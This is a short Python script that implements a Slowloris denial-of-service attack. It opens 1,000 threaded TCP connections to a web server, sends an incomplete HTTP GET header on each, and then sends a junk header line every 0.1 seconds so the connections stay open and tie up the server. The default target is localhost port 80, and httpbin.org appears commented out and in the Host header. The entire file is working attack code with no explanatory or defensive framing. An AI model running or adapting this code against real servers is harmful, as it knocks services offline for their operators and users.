import socket
from enum import Enum
from threading import Thread
import time

# HOST = "httpbin.org"
HOST = "127.0.0.1"
PORT = 80

SLOW_LORIS_HEADER = "GET / HTTP/1.1\r\nHost: httpbin.org\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: pl,en-US;q=0.7,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\n"

class HTTPMethod(Enum):
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"
    HEAD = "HEAD"
    CONNECT = "CONNECT"
    OPTIONS = "OPTIONS"
    TRACE = "TRACE"
    PATCH = "PATCH"



class ClientThread(Thread):
    def __init__(self, host, port, id):
        super().__init__()
        self.host = host
        self.port = port
        self.id = id
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
    
    def run(self):
        self.sock.sendall(SLOW_LORIS_HEADER.encode())
        print(f"Thread {self.id} sent header")
        while True:
            try:
                self.sock.sendall(b"X-a: b\r\n")
                print(f"Thread {self.id} sent data")
                time.sleep(0.1)
            except BrokenPipeError:
                pass



class Client:
    def __init__(self, host=HOST, port=PORT):
        self.host = host
        self.port = port


    def performSlowLorisAttack(self, threads=1000):
        for i in range(threads):
            time.sleep(0.02)
            ClientThread(self.host, self.port, i).start()

if __name__ == "__main__":
    client = Client()
    client.performSlowLorisAttack()